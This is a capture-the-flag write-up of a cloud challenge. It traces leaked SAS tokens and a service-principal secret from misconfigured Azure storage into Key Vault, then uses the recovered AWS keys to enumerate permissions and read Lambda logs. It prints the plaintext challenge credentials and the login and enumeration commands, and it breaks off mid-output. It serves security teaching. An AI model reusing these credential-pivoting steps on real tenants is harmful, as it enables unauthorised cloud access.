# Secret of Meow Olympurr (Cloud)

Jaga reached Meow Olympurr and met some native Meows. While cautious at first, they warmed up and shared that they have recently created a website to promote tourism!
However, the young Meows explained that they are not cy-purr security trained and would like to understand what they might have misconfigured in their environments. The young Meows were trying to get two different environments to work together, but it seems like something is breaking....
Log a cy-purr security case by invoking the mysterious function and retrieve the secret code!
d2p9lw76n0gfo0.cloudfront.net (WRITEUP NOTE: This is no longer accessible)

# Analysis
Visiting the given cloudfront site, we are greeted by some cat pictures. Viewing source and cookie revealed no obvious clues to the next step.

![img.png](img.png)

What we do know however, is that this is a cloud challenge and cloudfront is an AWS product for hosting websites. Inspecting the response headers when loading the website, we can confirm it comes from an AWS S3 bucket.

![img_1.png](img_1.png)

It would make perfect sense to try to find the name of the AWS bucket, however I was unable to until much later when I found it but realised it was not needed anyway. I was pretty lost at this point, so I decided to scrutinize the challenge description and trying random (and stupid) things.

## Azure
The challenge description mentioned something about a `mysterious` function. I tried to access d2p9lw76n0gfo0.cloudfront.net/mysterious, hoping that it is a real endpoint. I was greeted with an error page, but something seems fishy about the error page:

![img_2.png](img_2.png)

There seem to be an image that for some reason did not load. I thought this is weird because all the other cat images loaded properly on the homepage, so I decided to view source and check. This is when I found out the clues to the next step.

The image failing to load is `<img src="http://18.141.147.115:8080/https://meowolympurr.z23.web.core.windows.net/images/ohno.jpg"/>`. We can immediately see a different domain being mentioned here: `web.core.windows.net`. A quick Google revealed that it is Microsoft Azure's equivalent of AWS Cloudfront. This must be what the challenge description says about "get two different environments to work together".

I first tried to access `18.141.147.115:8080` but it was not accessible. Then I tried to visit `https://meowolympurr.z23.web.core.windows.net` and it worked, albeit it just looks like a clone of the AWS version - until I scrolled to the bottom and saw something new:

![img_3.png](img_3.png)

Clicking on it, we are brought to a new endpoint: `https://olympurr-app.azurewebsites.net/api/meowvellous`. It seems to allow for us to enter a URL then do something in the backend. I tried to enter a Requestbin endpoint and just got a boring GET request with nothing valuable inside - except that the request has its user-agent set to `python-requests/2.28.1` but somehow includes an AWS tracking ID. I can tell there is some sort of fusion between AWS and a Python script, which is likely AWS's Lambda function. However, so far it does not provide any hint to the next step.

![img_4.png](img_4.png)

Stuck again, I decided to go back to looking for the AWS S3 bucket. I naively just tried the same name as the Azure website: `https://meowolympurr.s3.amazonaws.com/`, and it worked - although the bucket seems protected. I tried to access it using my own AWS account as authentication as some buckets are set to be accessible as long as you are logged in to any AWS account - but still no luck.

I realised now that since AWS Cloudfront serves site from a S3 bucket, the Azure version must also serve from some Azure storage service. Lazy and short of time to read the Azure docs, I resorted to online brute force tools: https://github.com/initstring/cloud_enum. It worked surprisingly well when I tried to scan for `meowolympurr`, discovering a valid Azure Blob container (AWS S3 equivalent) at `https://meowolympurr.blob.core.windows.net/`. Command used to scan: `python3 cloud_enum.py -k meowolympurr `

![img_16.png](img_16.png)

Trying to access `https://meowolympurr.blob.core.windows.net/` directly, however, gave an error about some missing `comp` parameter. Passing in it in the URL gave another error. I figured it cannot be so easily accessed, so I turned back to the Azure version of the blog for more hints.

![img_5.png](img_5.png)

I remembered that the error page on the AWS edition gave me the hint to the existence of Azure site, so I went to try the same on the Azure version by trying to visit `https://meowolympurr.z23.web.core.windows.net/mysterious`. I was again greeted with an error page, but inspecting source revealed the hint to next step: `For access to website source codes: 
              https://meowolympurr.blob.core.windows.net?sv=2017-07-29&ss=b&srt=sco&sp=rl&se=2022-12-12T00:00:00Z&st=2022-09-01T00:00:00Z&spr=https&sig=UE2%2FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%3D`

With zero Azure knowledge, I had to first find out what this URL does (since accessing it directly gave an error). Googling 'Azure blob' together with some parameters like `ss`, `sv`, `srt` revealed that it is a SAS URL, something used to share Blob containers with people. Only those that have this URL will be able to access it. Documentation can be found here: https://learn.microsoft.com/en-us/rest/api/storageservices/create-account-sas

Now I need to find how to access the contents in this blob container. I went to my old friend PayloadAllTheThings and found a relevant section on SAS URLs: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md#sas-url. Following the suggestion, I downloaded [Azure Storage Explorer](https://azure.microsoft.com/en-us/products/storage/storage-explorer/#overview) and added the SAS URL as a Blob Container:

![img_6.png](img_6.png)

I was however greeted by an error: The URL is missing a path to the resource. I then tried other options since there are many, and succeeded with adding it as a 'Storage account and Service'. Guess the PayloadAllTheThings instruction is not exactly for my use case, but it still pointed me to the right tool.

![img_7.png](img_7.png)

We can see the parameters in the URL being parsed correctly here:

![img_8.png](img_8.png)

I manually searched up each parameter in the documentation to confirm.

Connecting, we can see 3 folders, and the $web folder seems to hold the blog site.

![img_9.png](img_9.png)

I first checked $logs (which is empty), then checked $web and found nothing new. Then I went to dev and found a readme file there. The file reads:
```markdown
# Meow Olympurr 
One stop service for all fun activites in Meow Olympurr! 
    
All resources are hosted on a single tenant: 83e595f4-f086-4f2f-9de8-d698b6012093

Meows are not cy-purr security trained, but we are willing to learn! 
    
# To do 
1. Consolidate the asset list 
2. Seek advice from Jaga and team when they arrive! 
3. Integrate services 
4. Remove credentials used for debugging access to function app

# Function app - https://olympurr-app.azurewebsites.net/api/meowvellous
SAS token to access the scm-releases container: ?sv=2018-11-09&sr=c&st=2022-09-01T00%3A00%3A00Z&se=2022-12-12T00%3A00%3A00Z&sp=rl&spr=https&sig=jENgCFTrC1mYM1ZNo%2F8pq1Hg9BO1VLbXlk%2FpABrK4Eo%3D

## Credentials for debugging
The following service principal has the same privileges as the function app
Application ID: ee92075f-4ddc-4522-a12c-2bc0ab874c85
Client Secret: kmk8Q~mGYD9jNfgm~rcIOMRgiC9ekKtNEw5GPaS7
```
Now I need to interpret the new information.
1. There is another Blob container that contains the source code for the API, which is hosted on Azure Function 4.0 (can be found if we visit `https://olympurr-app.azurewebsites.net`).
2. We have an Azure account that probably have enough privileges for us to download the source code of the function.

Before anything, we should log in to Azure cli with the given credentials. I followed https://learn.microsoft.com/en-us/cli/azure/install-azure-cli to install Azure CLI (I'm on Windows).

Then I followed https://learn.microsoft.com/en-us/cli/azure/authenticate-azure-cli to sign in with the information I have. The sign in cmd is `az login --service-principal -u ee92075f-4ddc-4522-a12c-2bc0ab874c85 -p kmk8Q~mGYD9jNfgm~rcIOMRgiC9ekKtNEw5GPaS7 --tenant 83e595f4-f086-4f2f-9de8-d698b6012093`.

Then I followed https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md#enumerate-tenant-with-az-cli and enumerated things. Only `az storage account list` returned something:
```json
[
  {
    "accessTier": "Hot",
    "allowBlobPublicAccess": true,
    "allowCrossTenantReplication": true,
    "allowSharedKeyAccess": true,
    "allowedCopyScope": null,
    "azureFilesIdentityBasedAuthentication": null,
    "blobRestoreStatus": null,
    "creationTime": "2022-11-18T03:22:43.820513+00:00",
    "customDomain": null,
    "defaultToOAuthAuthentication": false,
    "dnsEndpointType": null,
    "enableHttpsTrafficOnly": true,
    "enableNfsV3": false,
    "encryption": {
      "encryptionIdentity": null,
      "keySource": "Microsoft.Storage",
      "keyVaultProperties": null,
      "requireInfrastructureEncryption": null,
      "services": {
        "blob": {
          "enabled": true,
          "keyType": "Account",
          "lastEnabledTime": "2022-11-18T03:22:44.648613+00:00"
        },
        "file": {
          "enabled": true,
          "keyType": "Account",
          "lastEnabledTime": "2022-11-18T03:22:44.648613+00:00"
        },
        "queue": null,
        "table": null
      }
    },
    "extendedLocation": null,
    "failoverInProgress": null,
    "geoReplicationStats": null,
    "id": "/subscriptions/bb11df92-eff5-47b6-b940-a3ce6ded6431/resourceGroups/meow-olympurr-resource-group/providers/Microsoft.Storage/storageAccounts/meowolympurr",
    "identity": {
      "principalId": null,
      "tenantId": null,
      "type": "None",
      "userAssignedIdentities": null
    },
    "immutableStorageWithVersioning": null,
    "isHnsEnabled": false,
    "isLocalUserEnabled": null,
    "isSftpEnabled": null,
    "keyCreationTime": {
      "key1": "2022-11-18T03:22:43.898664+00:00",
      "key2": "2022-11-18T03:22:43.898664+00:00"
    },
    "keyPolicy": null,
    "kind": "StorageV2",
    "largeFileSharesState": null,
    "lastGeoFailoverTime": null,
    "location": "southeastasia",
    "minimumTlsVersion": "TLS1_2",
    "name": "meowolympurr",
    "networkRuleSet": {
      "bypass": "AzureServices",
      "defaultAction": "Allow",
      "ipRules": [],
      "resourceAccessRules": null,
      "virtualNetworkRules": []
    },
    "primaryEndpoints": {
      "blob": "https://meowolympurr.blob.core.windows.net/",
      "dfs": "https://meowolympurr.dfs.core.windows.net/",
      "file": "https://meowolympurr.file.core.windows.net/",
      "internetEndpoints": null,
      "microsoftEndpoints": null,
      "queue": "https://meowolympurr.queue.core.windows.net/",
      "table": "https://meowolympurr.table.core.windows.net/",
      "web": "https://meowolympurr.z23.web.core.windows.net/"
    },
    "primaryLocation": "southeastasia",
    "privateEndpointConnections": [],
    "provisioningState": "Succeeded",
    "publicNetworkAccess": "Enabled",
    "resourceGroup": "meow-olympurr-resource-group",
    "routingPreference": null,
    "sasPolicy": null,
    "secondaryEndpoints": null,
    "secondaryLocation": null,
    "sku": {
      "name": "Standard_LRS",
      "tier": "Standard"
    },
    "statusOfPrimary": "available",
    "statusOfSecondary": null,
    "storageAccountSkuConversionStatus": null,
    "tags": {},
    "type": "Microsoft.Storage/storageAccounts"
  },
  {
    "accessTier": "Hot",
    "allowBlobPublicAccess": true,
    "allowCrossTenantReplication": true,
    "allowSharedKeyAccess": true,
    "allowedCopyScope": null,
    "azureFilesIdentityBasedAuthentication": null,
    "blobRestoreStatus": null,
    "creationTime": "2022-11-18T03:22:43.867383+00:00",
    "customDomain": null,
    "defaultToOAuthAuthentication": false,
    "dnsEndpointType": null,
    "enableHttpsTrafficOnly": true,
    "enableNfsV3": false,
    "encryption": {
      "encryptionIdentity": null,
      "keySource": "Microsoft.Storage",
      "keyVaultProperties": null,
      "requireInfrastructureEncryption": null,
      "services": {
        "blob": {
          "enabled": true,
          "keyType": "Account",
          "lastEnabledTime": "2022-11-18T03:22:44.601744+00:00"
        },
        "file": {
          "enabled": true,
          "keyType": "Account",
          "lastEnabledTime": "2022-11-18T03:22:44.601744+00:00"
        },
        "queue": null,
        "table": null
      }
    },
    "extendedLocation": null,
    "failoverInProgress": null,
    "geoReplicationStats": null,
    "id": "/subscriptions/bb11df92-eff5-47b6-b940-a3ce6ded6431/resourceGroups/meow-olympurr-resource-group/providers/Microsoft.Storage/storageAccounts/meowvellousappstorage",
    "identity": {
      "principalId": null,
      "tenantId": null,
      "type": "None",
      "userAssignedIdentities": null
    },
    "immutableStorageWithVersioning": null,
    "isHnsEnabled": false,
    "isLocalUserEnabled": null,
    "isSftpEnabled": null,
    "keyCreationTime": {
      "key1": "2022-11-18T03:22:43.945504+00:00",
      "key2": "2022-11-18T03:22:43.945504+00:00"
    },
    "keyPolicy": null,
    "kind": "StorageV2",
    "largeFileSharesState": null,
    "lastGeoFailoverTime": null,
    "location": "southeastasia",
    "minimumTlsVersion": "TLS1_2",
    "name": "meowvellousappstorage",
    "networkRuleSet": {
      "bypass": "AzureServices",
      "defaultAction": "Allow",
      "ipRules": [],
      "resourceAccessRules": null,
      "virtualNetworkRules": []
    },
    "primaryEndpoints": {
      "blob": "https://meowvellousappstorage.blob.core.windows.net/",
      "dfs": "https://meowvellousappstorage.dfs.core.windows.net/",
      "file": "https://meowvellousappstorage.file.core.windows.net/",
      "internetEndpoints": null,
      "microsoftEndpoints": null,
      "queue": "https://meowvellousappstorage.queue.core.windows.net/",
      "table": "https://meowvellousappstorage.table.core.windows.net/",
      "web": "https://meowvellousappstorage.z23.web.core.windows.net/"
    },
    "primaryLocation": "southeastasia",
    "privateEndpointConnections": [],
    "provisioningState": "Succeeded",
    "publicNetworkAccess": "Enabled",
    "resourceGroup": "meow-olympurr-resource-group",
    "routingPreference": null,
    "sasPolicy": null,
    "secondaryEndpoints": null,
    "secondaryLocation": null,
    "sku": {
      "name": "Standard_LRS",
      "tier": "Standard"
    },
    "statusOfPrimary": "available",
    "statusOfSecondary": null,
    "storageAccountSkuConversionStatus": null,
    "tags": {},
    "type": "Microsoft.Storage/storageAccounts"
  }
]
```
That looked like a lot of info, but essentially there are only 2 storage accounts under this tenant (Azure's way of calling a user account): `meowolympurr` and `meowvellousappstorage`, and one of them must be the one holding the `scm-releases` blob container.

The way that a SAS URL is constructed is as follows: storage endpoint + SAS Token. We can first try the one we already have, namely `https://meowolympurr.blob.core.windows.net/`, however it says invalid signature. So I went to try the other one. The full URL should be `https://meowvellousappstorage.blob.core.windows.net/?sv=2018-11-09&sr=c&st=2022-09-01T00%3A00%3A00Z&se=2022-12-12T00%3A00%3A00Z&sp=rl&spr=https&sig=jENgCFTrC1mYM1ZNo%2F8pq1Hg9BO1VLbXlk%2FpABrK4Eo%3D`. Pasting this into Azure Storage Explorer as a Storage account and Service will however result in an error:

![img_10.png](img_10.png)

The error message mentioned missing parameters `ss` and `srt`, but it is unlikely that we can just add them ourselves by taking the value from the URL that was used to access website source code, because the `sig` parameter is actually a digital signature of all the previous fields, and if they are not validated, they would not work. I decided to trust PayloadAllTheThings again and chose to add it as a Blob container:

![img_11.png](img_11.png)

Another error. This time it prompts for missing path. I got stuck here a bit, but quickly realised that if we are trying to access a particular Blob container on the storage account and the URL is not for accounts, then the name of the container must appear somewhere in the URL. I then inserted the name of the container `scm-releases` before the parameters: `https://meowvellousappstorage.blob.core.windows.net/scm-releases?sv=2018-11-09&sr=c&st=2022-09-01T00%3A00%3A00Z&se=2022-12-12T00%3A00%3A00Z&sp=rl&spr=https&sig=jENgCFTrC1mYM1ZNo%2F8pq1Hg9BO1VLbXlk%2FpABrK4Eo%3D`

![img_12.png](img_12.png)

![img_13.png](img_13.png)

And it worked! We can now see the contents of the Blob container:

![img_14.png](img_14.png)

If we download and try to open with Windows Explorer, it will give an error. I then tried 7zip and it managed to extract but gave some warning about the zip file is not actually a zip file but a SquashFS format. I am guessing this is part of the challenge or this is just how Azure storage handles zip files internally. Extracting the file, we can see the source code for the AWS Lambda function, and the only noteworthy file is `__init__.py`. The file is uploaded [here](__init__.py).

At a glance, it looks like the Lambda function is called `event-webservice`. There is also a key which looks like an AWS one: `AKIA5G4XMRW7TLT6XD7R`. `AKIA` is the prefix for permanent AWS IAM access keys.

If we try to run this part of the code, we will get an error since we do not have locally stored Azure credentials, so we cannot access the Azure Vault.
```python
identity = ManagedIdentityCredential()
secretClient = SecretClient(vault_url="https://olympurr-aws.vault.azure.net/", credential=identity)
secret = secretClient.get_secret(keyName).value
session = boto3.Session(
    aws_access_key_id=keyName,
    aws_secret_access_key=secret
)
```
We can, however, use Azure CLI and the credentials provided previously to get the secret from the vault. Referring to [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md#keyvault-secrets)(again), we can use `Get-AzKeyVaultSecret -VaultName olympurr-aws -Name AKIA5G4XMRW7TLT6XD7R -AsPlainText`. Vault name can be inferred from the vault URL, similar to how AWS S3 format their bucket URL using the bucket name. Key name can be inferred from reading the function code `secretClient.get_secret(keyName)`. **But wait**, we cannot run this directly because this is for Azure Powershell, and so far we only set up Azure CLI. These are two different tools and does not share stored credentials. To set up Azure Powershell, we can use the following Powershell commands:
```powershell
$azureAplicationId ="ee92075f-4ddc-4522-a12c-2bc0ab874c85"
$azureTenantId= "83e595f4-f086-4f2f-9de8-d698b6012093"
$azurePassword = ConvertTo-SecureString "kmk8Q~mGYD9jNfgm~rcIOMRgiC9ekKtNEw5GPaS7" -AsPlainText -Force
$psCred = New-Object System.Management.Automation.PSCredential($azureAplicationId , $azurePassword)
Enable-AzureRmAlias
Add-AzureRmAccount -Credential $psCred -TenantId $azureTenantId  -ServicePrincipal
```

If login is successful, you should see something like this:

![img_15.png](img_15.png)

Now, we can finally retrieve the secret from Azure vault: `fgQdSIETJp/yBKwWbmf2SprGa2eXWyqgkeeIdWtL`.

We can modify the function script to remove all the useless things and set the secret and url as a constant, and saving the Lambda invoke result as a variable `r`:
```python
import boto3
import requests
import json
import azure.functions as func
functionName = "event-webservice"
keyName = "AKIA5G4XMRW7TLT6XD7R"
secret = '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'  # gotten from azure vault
url = 'https://enqr1887xbuvq.x.pipedream.net/'  # Requestbin end point (but pretty useless in solving)
session = boto3.Session(
    aws_access_key_id=keyName,
    aws_secret_access_key=secret
)
details = {"url" : url}
r = lambda_client.invoke(
    FunctionName=functionName,
    InvocationType="RequestResponse",
    Payload=bytes(json.dumps(details), "utf-8")
)
```
We can do a test run and make sure our AWS credentials are valid and correctly invokes the Lambda function. This allows us to move on to AWS CLI and proceed from there. We will need this snippet again later.

# AWS
Logging in go AWS CLI using `aws configure` and set the profile name and access key (`AKIA5G4XMRW7TLT6XD7R`) and secret key (`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`), and set the default region be `ap-southeast-1`. We can now do some enumeration to find out more about our AWS credential.

I use [pacu](https://github.com/RhinoSecurityLabs/pacu) for this purpose, but you can use other tools you like. We can first do `run iam__bruteforce_permissions` and then `whoami` to find out what permissions do we have. Note that while this list can be incomplete, it is enough for us to try out things.

According to pacu, we have the following permissions:
```
"ec2:DescribeLogGroups",
"s3:DescribeLogGroups",
"logs:DescribeLogGroups",
"ec2:DescribeLogStreams",
"s3:DescribeLogStreams",
"logs:DescribeLogStreams",
"ec2:GetQueryResults",
"s3:GetQueryResults",
"logs:GetQueryResults"
```
It is interesting to see so many `logs` related permissions, so let's explore them first. Running `aws logs describe-log-groups` indeed yields interesting things:
```json
{
    "logGroups": [
        {
            "logGroupName": "/aws/lambda/agent-webservice",
            "creationTime": 1665202979754,
            "metricFilterCount": 0,
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/agent-webservice:*",
            "storedBytes": 687
        },
        {
            "logGroupName": "/aws/lambda/amplify-stfmobilechalleng-UpdateRolesWithIDPFuncti-LUiAZ9V8Ozui",
            "creationTime": 1661694112426,
            "metricFilterCount": 0,
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/amplify-stfmobilechalleng-UpdateRolesWithIDPFuncti-LUiAZ9V8Ozui:*",
            "storedBytes": 964
        },
        {
            "logGroupName": "/aws/lambda/amplify-stfmobilechallenge-pr-UserPoolClientLambda-zd7XTYeuNczP",
            "creationTime": 1661694081981,
            "metricFilterCount": 0,
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/amplify-stfmobilechallenge-pr-UserPoolClientLambda-zd7XTYeuNczP:*",
            "storedBytes": 807
        },
        {
            "logGroupName": "/aws/lambda/amplify-stfmobilechallenge-prod-21-RoleMapFunction-iQfrqN7EZzDT",
            "creationTime": 1661694156003,
            "metricFilterCount": 0,
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/amplify-stfmobilechallenge-prod-21-RoleMapFunction-iQfrqN7EZzDT:*",
            "storedBytes": 1123
        },
        {
            "logGroupName": "/aws/lambda/event-webservice",
            "creationTime": 1664456644866,
            "metricFilterCount": 0,
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/event-webservice:*",
            "storedBytes": 3807231
        },
        {
            "logGroupName": "/aws/lambda/internal-secret-of-MeowOlympurr-webservice",
            "creationTime": 1664456602816,
            "metricFilterCount": 0,
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/internal-secret-of-MeowOlympurr-webservice:*",
            "storedBytes": 18021
        }
    ]
}
```
The last log group seems very suspicious by the name. Let's try to get its log streams of it using `aws logs describe-log-streams --log-group-name /aws/lambda/internal-secret-of-MeowOlympurr-webservice`
```json
{
    "logStreams": [
        {
            "logStreamName": "2022/09/29/[$LATEST]89365d3113c74e2b8025c903e929c699",
            "creationTime": 1664456602877,
            "firstEventTimestamp": 1664456598757,
            "lastEventTimestamp": 1664456599885,
            "lastIngestionTime": 1664456602885,
            "uploadSequenceToken": "49631374357748980131057872210468490102701359339921212082",
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/internal-secret-of-MeowOlympurr-webservice:log-stream:2022/09/29/[$LATEST]89365d3113c74e2b8025c903e929c699",
            "storedBytes": 0
        },
        {
            "logStreamName": "2022/11/18/[$LATEST]44ce7a2544da4bfc948f03282b91d0cf",
            "creationTime": 1668780227368,
            "firstEventTimestamp": 1668780224001,
            "lastEventTimestamp": 1668780225039,
            "lastIngestionTime": 1668780227376,
            "uploadSequenceToken": "49635250750640673817660415146841146067518925277000369794",
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/internal-secret-of-MeowOlympurr-webservice:log-stream:2022/11/18/[$LATEST]44ce7a2544da4bfc948f03282b91d0cf",
            "storedBytes": 0
        },
        {
            "logStreamName": "2022/11/18/[$LATEST]803096422d324424bc55d265db6b5ee9",
            "creationTime": 1668742517651,
            "firstEventTimestamp": 1668742514413,
            "lastEventTimestamp": 1668742515532,
            "lastIngestionTime": 1668742517660,
            "uploadSequenceToken": "49634141007822965614862830752878321332479779902815470258",
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/internal-secret-of-MeowOlympurr-webservice:log-stream:2022/11/18/[$LATEST]803096422d324424bc55d265db6b5ee9",
            "storedBytes": 0
        },
        {
            "logStreamName": "2022/11/27/[$LATEST]525bef0571874b589a033e02ee282928",
            "creationTime": 1669592954366,
            "firstEventTimestamp": 1669592947317,
            "lastEventTimestamp": 1669592948460,
            "lastIngestionTime": 1669592954376,
            "uploadSequenceToken": "49634141007822965614864522610998255550287658306502656690",
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/internal-secret-of-MeowOlympurr-webservice:log-stream:2022/11/27/[$LATEST]525bef0571874b589a033e02ee282928",
            "storedBytes": 0
        },
        {
            "logStreamName": "2022/11/28/[$LATEST]59885450cedc4a8092a374403acb4bb5",
            "creationTime": 1669607695179,
            "firstEventTimestamp": 1669607688240,
            "lastEventTimestamp": 1669607689285,
            "lastIngestionTime": 1669607695186,
            "uploadSequenceToken": "49635250750640673817661000149815897218011457159451117186",
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/internal-secret-of-MeowOlympurr-webservice:log-stream:2022/11/28/[$LATEST]59885450cedc4a8092a374403acb4bb5",
            "storedBytes": 0
        },
        {
            "logStreamName": "2022/11/30/[$LATEST]1bd5f0d88e6841b59aea7798351105e9",
            "creationTime": 1669817055882,
            "firstEventTimestamp": 1669817052622,
            "lastEventTimestamp": 1669817053652,
            "lastIngestionTime": 1669817055939,
            "uploadSequenceToken": "49635194104473193539628283425253718276662222208809042466",
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/internal-secret-of-MeowOlympurr-webservice:log-stream:2022/11/30/[$LATEST]1bd5f0d88e6841b59aea7798351105e9",
            "storedBytes": 0
        },
        {
            "logStreamName": "2022/11/30/[$LATEST]39db32b80f964c93ad681823a64ff00c",
            "creationTime": 1669818860028,
            "firstEventTimestamp": 1669818852955,
            "lastEventTimestamp": 1669818854024,
            "lastIngestionTime": 1669818860034,
            "uploadSequenceToken": "49635597786452373156572302985141261615997096737017692674",
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/internal-secret-of-MeowOlympurr-webservice:log-stream:2022/11/30/[$LATEST]39db32b80f964c93ad681823a64ff00c",
            "storedBytes": 0
        },
        {
            "logStreamName": "2022/12/02/[$LATEST]dbce73b07fa64f0b82fa83577160ba32",
            "creationTime": 1670009971366,
            "firstEventTimestamp": 1670009963542,
            "lastEventTimestamp": 1670009964613,
            "lastIngestionTime": 1670009971376,
            "uploadSequenceToken": "49635660820356105120920919002805160662557027232886294178",
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/internal-secret-of-MeowOlympurr-webservice:log-stream:2022/12/02/[$LATEST]dbce73b07fa64f0b82fa83577160ba32",
            "storedBytes": 0
        },
        {
            "logStreamName": "2022/12/02/[$LATEST]faf38821516c4b5985fe4a2ed190726f",
            "creationTime": 1670003300450,
            "firstEventTimestamp": 1670003293297,
            "lastEventTimestamp": 1670003330977,
            "lastIngestionTime": 1670003339872,
            "uploadSequenceToken": "49632778342330129262936124017537809557000694990716798610",
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/internal-secret-of-MeowOlympurr-webservice:log-stream:2022/12/02/[$LATEST]faf38821516c4b5985fe4a2ed190726f",
            "storedBytes": 0
        },
        {
            "logStreamName": "2022/12/03/[$LATEST]1c3bf0fb30964dcdacfd60be36a41392",
            "creationTime": 1670104927460,
            "firstEventTimestamp": 1670104918403,
            "lastEventTimestamp": 1670104961396,
            "lastIngestionTime": 1670104970199,
            "uploadSequenceToken": "49635194104473193539628538635345439891835593256284979746",
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/internal-secret-of-MeowOlympurr-webservice:log-stream:2022/12/03/[$LATEST]1c3bf0fb30964dcdacfd60be36a41392",
            "storedBytes": 0
        }
    ]
}
```
Note: More results were omitted as they are not needed for solving the challenge. In fact, we only need one of them as all of them contain the same information.

We can try to get the log contents of one of them using `aws logs get-log-events --log-group-name /aws/lambda/internal-secret-of-MeowOlympurr-webservice --log-stream-name 2022/12/03/[$LATEST]1c3bf0fb30964dcdacfd60be36a41392`. Although pacu did not explicitly list this as a permitted operation, we actually have the permissions to do so. One hiccup I countered was if you use zsh shell in Kali Linux, you have to use backslash to escape the $ in $LATEST, if not it will be treated as a variable and you will get a not found error from AWS.

```json
{
    "events": [
        {
            "timestamp": 1670104918403,
            "message": "START RequestId: 4dba6015-d11d-47fe-8576-7e970d561dd7 Version: $LATEST\n",
            "ingestionTime": 1670104927469
        },
        {
            "timestamp": 1670104919455,
            "message": "Cy-purr incident logged. Details returned in response.\n",
            "ingestionTime": 1670104927469
        },
        {
            "timestamp": 1670104919475,
            "message": "END RequestId: 4dba6015-d11d-47fe-8576-7e970d561dd7\n",
            "ingestionTime": 1670104927469
        },
        {
            "timestamp": 1670104919475,
            "message": "REPORT RequestId: 4dba6015-d11d-47fe-8576-7e970d561dd7\tDuration: 1072.91 ms\tBilled Duration: 1073 ms\tMemory Size: 128 MB\tMax Memory Used: 64 MB\tInit Duration: 249.62 ms\t\n",
            "ingestionTime": 1670104927469
        },
        {
            "timestamp": 1670104931049,
            "message": "START RequestId: 58e9b6b1-6ec5-418a-bb2d-555bffdc077b Version: $LATEST\n",
            "ingestionTime": 1670104940070
        },
        {
            "timestamp": 1670104931228,
            "message": "Cy-purr incident logged. Details returned in response.\n",
            "ingestionTime": 1670104940070
        },
        {
            "timestamp": 1670104931235,
            "message": "END RequestId: 58e9b6b1-6ec5-418a-bb2d-555bffdc077b\n",
            "ingestionTime": 1670104940070
        },
        {
            "timestamp": 1670104931235,
            "message": "REPORT RequestId: 58e9b6b1-6ec5-418a-bb2d-555bffdc077b\tDuration: 186.20 ms\tBilled Duration: 187 ms\tMemory Size: 128 MB\tMax Memory Used: 65 MB\t\n",
            "ingestionTime": 1670104940070
        },
        {
            "timestamp": 1670104941839,
            "message": "START RequestId: 46ac632a-000d-455a-a31d-b3a293caac05 Version: $LATEST\n",
            "ingestionTime": 1670104950861
        },
        {
            "timestamp": 1670104942031,
            "message": "Cy-purr incident logged. Details returned in response.\n",
            "ingestionTime": 1670104950861
        },
        {
            "timestamp": 1670104942037,
            "message": "END RequestId: 46ac632a-000d-455a-a31d-b3a293caac05\n",
            "ingestionTime": 1670104950861
        },
        {
            "timestamp": 1670104942037,
            "message": "REPORT RequestId: 46ac632a-000d-455a-a31d-b3a293caac05\tDuration: 198.45 ms\tBilled Duration: 199 ms\tMemory Size: 128 MB\tMax Memory Used: 65 MB\t\n",
            "ingestionTime": 1670104950861
        },
        {
            "timestamp": 1670104961178,
            "message": "START RequestId: 722f2ef0-658d-42cf-8b6c-8121034e2a0f Version: $LATEST\n",
            "ingestionTime": 1670104970199
        },
        {
            "timestamp": 1670104961390,
            "message": "Cy-purr incident logged. Details returned in response.\n",
            "ingestionTime": 1670104970199
        },
        {
            "timestamp": 1670104961396,
            "message": "END RequestId: 722f2ef0-658d-42cf-8b6c-8121034e2a0f\n",
            "ingestionTime": 1670104970199
        },
        {
            "timestamp": 1670104961396,
            "message": "REPORT RequestId: 722f2ef0-658d-42cf-8b6c-8121034e2a0f\tDuration: 218.48 ms\tBilled Duration: 219 ms\tMemory Size: 128 MB\tMax Memory Used: 65 MB\t\n",
            "ingestionTime": 1670104970199
        }
    ],
    "nextForwardToken": "f/37244585198894018719737368029837252154619475174123241475/s",
    "nextBackwardToken": "b/37244584240118080399310287254134392811324946061492486144/s"
}
```
We can see that all the log messages are the same: `Cy-purr incident logged. Details returned in response.`. We are not sure of what is the `response` referring to here, but we can guess it has to do with the flag. We can try to see other log groups and log streams, for example, the log group for the Lambda function `event-webservice`.

Running `aws logs get-log-events --log-group-name /aws/lambda/event-webservice --log-stream-name 2022/12/05/[$LATEST]eef7ef207d194230876e0d163f60da5f` gives:
```json
{
    "events": [
        {
            "timestamp": 1670252183314,
            "message": "START RequestId: 3a8e49c7-b64d-4d11-8761-a07891458f99 Version: $LATEST\n",
            "ingestionTime": 1670252189901
        },
        {
            "timestamp": 1670252183314,
            "message": "Received the following URL\n",
            "ingestionTime": 1670252189901
        },
        {
            "timestamp": 1670252183314,
            "message": "https://meowolympurr.blob.core.windows.net/dev/readme.md\n",
            "ingestionTime": 1670252189901
        },
        {
            "timestamp": 1670252183315,
            "message": "END RequestId: 3a8e49c7-b64d-4d11-8761-a07891458f99\n",
            "ingestionTime": 1670252189901
        },
        {
